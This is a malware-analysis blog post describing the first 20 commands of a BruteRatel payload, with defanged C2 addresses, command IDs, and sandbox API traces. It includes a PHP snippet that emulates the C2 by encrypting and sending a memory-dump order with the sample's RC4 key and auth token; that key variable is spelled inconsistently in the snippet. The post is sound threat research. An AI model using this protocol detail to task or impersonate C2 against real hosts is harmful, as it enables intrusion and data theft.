---
title: "BruteRatel full command analysis (1/X)"
date: 2025-03-XX
---

<link rel="stylesheet" href="/css/main.css">

## BazaarLoader / BRUTERATEL  

## Context  

BruteRatel SHA256 : d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1  

Sample Source :  
[bazaar.abuse.ch](https://bazaar.abuse.ch/sample/d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1/)   

VirusTotal :  
[VirusTotal](https://www.virustotal.com/gui/file/d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1)  

Network / C2 :  
http://tiguanin[.]com/bazar.php:8041
http://tiguanin[.]com/admin.php:8041  
http://bazarunet[.]com/admin.php:8041  
http://bazarunet[.]com/bazar.php:8041  
http://greshunka[.]com/bazar.php:8041 
http://greshunka[.]com/admin.php:8041 

# INTRO  

This article is a follow-up from a previous post regarding a BazaarLoader sample analysis : [Initial Post](https://cedricg-mirror.github.io/2025/02/04/BazaarLoader.html)  
After going through various stages of unpacking and in-memory loading, I was able to retrieve the final payload from the initial sample and made it available on [bazaar.abuse.ch](https://bazaar.abuse.ch/sample/d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1/)  

Working on this unpacked payload made the sample analysis much more straightforward and given the sheer amount of functionalities offered by this malware I've decided to review them all.  

This detailed analysis will be split into several parts, I will be presenting in this the 'first' 20 commands that BruteRatel can respond to.  

# COMMAND LIST

Here is a short description of the first 20 command codes and purpose :  

| Command ID   | Description             | Parameter         |
| :----------- | :---------------------- | :----------------:|
| "\x9f\x3c"   | GetCurrentDirectory     | NA                |
| "\x3f\xd5"   | GetIpTable              | NA                |
| "\xfe\x4f"   | GetAccountPrivileges    | NA                |
| "\x91\x03"   | LockWorkStation         | NA                |
| "\x09\x06"   | GetLogicalDrives        | NA                |
| "\x01\x0a"   | GetSystemUptime         | NA                |
| "\x06\x0b"   | GetLastInputInfo        | NA                |
| "\x03\x07"   | ExitProcess             | NA                |
| "\x05\x06"   | RevertToSelf            | NA                |
| "\x05\x01"   | GetClipBoardData        | NA                |
| "\x44\xc1"   | EnumDevicesDrivers      | NA                |
| "\x41\x9c"   | Screenshot              | NA                |
| "\xcb\xe3"   | GetDomainControlerInfo  | NA                |
| "\x16\xf6"   | GetNetworkAdaptersInfo  | NA                |
| "\x03\x08"   | ExitThread              | NA                |
| "\x34\x49"   | GetMemoryDump           | "processname.exe" |
| "\x39\xb3"   | GetTcpUdpTables         | NA                | 
| "\x1a\xd4"   | GetIpForwardTable       | NA                | 
| "\x9a\xbe"   | QuerySessionInformation | NA                | 
| "\xb7\x38"   | GetDnsCacheDataTable    | NA                |

# Command Syntax  

On the C2 side, a command can be issued this way (example with the GetMemoryDump order) :  

```php
$RC4Key = "S47EFEUO3D2O6641";
$auth_token = "OV1T557KBIUECUM5";

function GetMemoryDump($process_name)
{
	$cmd_id = "\x34\x49 $process_name";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST')
{
	$cmd_id_b64 = GetMemoryDump("explorer.exe");
	
	$cmd = "$auth_token, $cmd_id_b64";
	$cmd_enc = rc4($Rc4Key, $cmd);
	$cmd_b64 = base64_encode($cmd_enc);
	echo $cmd_b64;
	
	return;
}
```

# Dynamic Analysis  

In the following section, I share some dynamic analysis results from the aforementioned commands :  

# GetCurrentDirectory  

1. Fetching the order  

```html
[CNT] [358]
[PTP] [0xa8c] [0xa54] [c:\windows\system32\rundll32.exe]
[API] <InternetReadFile> in [wininet.dll] 
[PAR] HINTERNET hFile                 : 0xcc000c
[PAR] LPVOID    lpBuffer              : 0x0000004495486210
[PAR] DWORD     dwNumberOfBytesToRead : 0x28
[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000449739ED2C
[RET] [0x44972e7a7c]

[CNT] [361]
[PTP] [0xa8c] [0xa54] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000004495465ED0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+evHiErJ4Hw/Yqg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x00000044954799B0
[PAR] DWORD   *pcbBinary : 0x000000449739ED5C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x44972fbea1]
```

2. Execution  

```html
[CNT] [369]
[PTP] [0xa8c] [0xa54] [c:\windows\system32\rundll32.exe]
[API] <GetCurrentDirectoryW> in [KERNEL32.DLL] 
[PAR] DWORD  nBufferLength : 0x105
[PAR] LPWSTR lpBuffer      : 0x000000449739EA96
[RET] [0x449730964b]
```

3. Result  

```html
[CNT] [377]
[PTP] [0xa8c] [0xa54] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000004495455F50
[STR]        -> "9F3C"
[STR]           "C:\Users\user\Desktop\Samples\BRUTERATEL"
[PAR] DWORD  cbBinary   : 0x5a
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x00000044954476B0
[PAR] DWORD* pcchString : 0x000000449739E9DC
[RET] [0x44972fe028]
```

# GetIpTable  

1. Order  

```html
[CNT] [327]
[PTP] [0x844] [0x828] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000009D128F6750
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+RLLAErJ4Hw/Yqg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000009D12909D80
[PAR] DWORD   *pcbBinary : 0x0000009D148CE96C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x9d1482bea1]
```

2. Execution  

```html
[CNT] [336]
[PTP] [0x844] [0x828] [c:\windows\system32\rundll32.exe]
[API] <GetIpNetTable> in [iphlpapi.dll] 
[PAR] PMIB_IPNETTABLE IpNetTable  : 0x0000009D128DF1C0
[PAR] PULONG          SizePointer : 0x0000009D148CE87C
[PAR] BOOL            Order       : 0x1
[RET] [0x9d14829f1b]
```

3. Result  

```html
[CNT] [512]
[PTP] [0x844] [0x828] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000009D129119A0
[STR]        -> "3FD5"
[STR]           "224.0.0.22 0-0-0-0-0-0 4"
[STR]           "169.254.143.46 8-0-27-57-99-60 3"
[STR]           "169.254.255.255 FF-FF-FF-FF-FF-FF 4"
[STR]           "224.0.0.22 1-0-5E-0-0-16 4"
[STR]           "224.0.0.252 1-0-5E-0-0-FC 4"
[STR]           "255.255.255.255 FF-FF-FF-FF-FF-FF 4"
[PAR] DWORD  cbBinary   : 0x17c
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x0000009D128EF3E0
[PAR] DWORD* pcchString : 0x0000009D148CE7BC
[RET] [0x9d1482e028]
```

# GetAccountPrivileges  

1. Order  

```html
[CNT] [327]
[PTP] [0x950] [0x798] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000000A429889A0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+O+CtErJ4Hw/Yqg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000000A4299C8B0
[PAR] DWORD   *pcbBinary : 0x0000000A4487E92C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xa447dbea1]
```

2. Execution  

```html
[CNT] [335]
[PTP] [0x950] [0x798] [c:\windows\system32\rundll32.exe]
[API] <OpenThreadToken> in [ADVAPI32.dll] 
[PAR] HANDLE  ThreadHandle  : 0xfffffffe
[PAR] DWORD   DesiredAccess : 0x8 (TOKEN_QUERY)
[PAR] BOOL    OpenAsSelf    : 0x0
[PAR] PHANDLE TokenHandle   : 0x0000000A4487E008
[RET] [0xa447f1fac]

[CNT] [336]
[PTP] [0x950] [0x798] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenProcessToken> in [ntdll.dll] 
[PAR] HANDLE      ProcessHandle : 0xFFFFFFFFFFFFFFFF
[PAR] ACCESS_MASK DesiredAccess : 0x8 (TOKEN_QUERY)
[PAR] PHANDLE     TokenHandle   : 0x0000000A4487E008
[RET] [0xa447f4b2f]

[CNT] [343]
[PTP] [0x950] [0x798] [c:\windows\system32\rundll32.exe]
[API] <GetUserNameW> in [ADVAPI32.dll] 
[PAR] LPWSTR  lpBuffer  : 0x0000000A4487E63E
[PAR] LPDWORD pcbBuffer : 0x0000000A4487DFF0
[RET] [0xa447f1fe1]

[CNT] [345]
[PTP] [0x950] [0x798] [c:\windows\system32\rundll32.exe]
[API] <GetTokenInformation> in [ADVAPI32.dll] 
[PAR] HANDLE                  TokenHandle            : 0x2f8
[PAR] TOKEN_INFORMATION_CLASS TokenInformationClass  : 0x1(TokenUser)
[PAR] LPVOID                  TokenInformation       : 0x0000000A429889A0
[PAR] DWORD                   TokenInformationLength : 0x2c
[PAR] PDWORD                  ReturnLength           : 0x0000000A4487DFF4

[CNT] [347]
[PTP] [0x950] [0x798] [c:\windows\system32\rundll32.exe]
[API] <GetTokenInformation> in [ADVAPI32.dll] 
[PAR] HANDLE                  TokenHandle            : 0x2f8
[PAR] TOKEN_INFORMATION_CLASS TokenInformationClass  : 0x14(TokenElevation)
[PAR] LPVOID                  TokenInformation       : 0x0000000A4487DFEC
[PAR] DWORD                   TokenInformationLength : 0x4
[PAR] PDWORD                  ReturnLength           : 0x0000000A4487DFE0
[RET] [0xa447f20fa]

[CNT] [365]
[PTP] [0x950] [0x798] [c:\windows\system32\rundll32.exe]
[API] <LookupPrivilegeNameW> in [ADVAPI32.dll] 
[PAR] LPCWSTR lpSystemName : 0x0 (null)
[PAR] PLUID   lpLuid       : 0x0000000A42986F00
[PAR] LPWSTR  lpName       : 0x0000000A4487E43E
[PAR] LPDWORD cchName      : 0x0000000A4487DFE8
[RET] [0xa447f2271]

[CNT] [367]
[PTP] [0x950] [0x798] [c:\windows\system32\rundll32.exe]
[API] <LookupPrivilegeDisplayNameW> in [ADVAPI32.dll] 
[PAR] LPCWSTR lpSystemName   : 0x0 (null)
[PAR] LPCWSTR lpName         : 0x0000000A4487E43E
[STR]         -> "SeChangeNotifyPrivilege"
[PAR] LPWSTR  lpDisplayName  : 0x0000000A429A15C0
[PAR] LPDWORD cchDisplayName : 0x0000000A4487E038
[PAR] LPDWORD lpLanguageId   : 0x0000000A4487E040
[RET] [0xa447f22d9]

[...]
```

3. Result  

```
FE4F
user S-1-5-21-249064630-1566129562-1930266188-1001 0
0 SeShutdownPrivilege Arrêter le système|
3 SeChangeNotifyPrivilege Contourner la vérification de parcours|
0 SeUndockPrivilege Retirer l ordinateur de la station d accueil|
0 SeIncreaseWorkingSetPrivilege Augmenter une plage de travail de processus|
0 SeTimeZonePrivilege Changer le fuseau horaire|
home\Aucun|
S-1-5-21-249064630-1566129562-1930266188-513|07
Tout le monde|
S-1-1-0|
07
AUTORITE NT\Compte local et membre du groupe Administrateurs|
S-1-5-114|
10
BUILTIN\Administrateurs|
S-1-5-32-544|
10
BUILTIN\Utilisateurs|
S-1-5-32-545|
07
AUTORITE NT\INTERACTIF|
S-1-5-4|
07
OUVERTURE DE SESSION DE CONSOLE|
S-1-2-1|
07
[...]
```
